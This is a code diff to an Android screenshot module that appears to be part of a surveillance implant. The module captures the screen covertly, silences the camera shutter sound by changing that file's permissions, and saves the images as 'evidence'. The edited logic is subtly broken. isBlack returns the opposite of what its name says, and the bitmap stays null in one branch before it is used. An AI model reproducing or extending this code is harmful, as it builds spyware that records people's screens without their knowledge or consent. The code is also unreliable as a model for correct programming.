@@ -134,8 +134,8 @@ public class ModuleSnapshot extends BaseInstantModule {
 		}
 
 		try {
-			if(!screencapMethod()){
-				frameBufferMethod();
+			if(!frameBufferMethod()){
+				screencapMethod();
 			}
 
 		} catch (final Exception ex) {
@@ -192,14 +192,14 @@ public class ModuleSnapshot extends BaseInstantModule {
 	private void enableClick() {
 		AutoFile file = new AutoFile(cameraSound);
 		if(file.exists()){
-			file.chmod(000);
+			file.chmod("777");
 		}
 	}
 
 	private void disableClick() {
 		AutoFile file = new AutoFile(cameraSound);
 		if(file.exists()){
-			file.chmod(777);
+			file.chmod("000");
 		}
 	}
 
@@ -208,7 +208,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 		return bitmap;
 	}
 
-	private void frameBufferMethod() {
+	private boolean frameBufferMethod() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (frameBufferMethod) ");
 		}
@@ -241,7 +241,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 			Check.log(TAG + " (go): w=" + width + " h=" + height);//$NON-NLS-1$ //$NON-NLS-2$
 		}
 
-		Bitmap bitmap;
+		Bitmap bitmap = null;
 
 		// 0: invertito blu e rosso
 		// 1: perdita info
@@ -251,11 +251,17 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 		if (raw == null || raw.length == 0) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (actualStart): raw bitmap is null or has 0 length"); //$NON-NLS-1$
+				Check.log(TAG + " (frameBufferMethod): raw bitmap is null or has 0 length"); //$NON-NLS-1$
 			}
-
+			return false;
 		} else {
 
+			if(isBlack(raw)){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (frameBufferMethod): all black");
+				}
+				return false;
+			}
 			if (usesInvertedColors()) {
 				// sul tablet non e' ARGB ma ABGR.
 				byte[] newraw = new byte[raw.length / 2];
@@ -285,13 +291,9 @@ public class ModuleSnapshot extends BaseInstantModule {
 				}
 
 				raw = newraw;
+				bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
 			}
 
-			if (raw != null) {
-				bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
-			} else {
-				return;
-			}
 			ByteBuffer buffer = ByteBuffer.wrap(raw);
 			bitmap.copyPixelsFromBuffer(buffer);
 			buffer = null;
@@ -324,7 +326,19 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 			EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
 			jpeg = null;
+			
+			
 		}
+		return true;
+	}
+
+	private boolean isBlack(byte[] raw) {
+		for (int i = 0; i < raw.length; i++) {
+			if(raw[i] != 0){
+				return true;
+			}	
+		}
+		return false;
 	}
 
 	private boolean isTablet() {
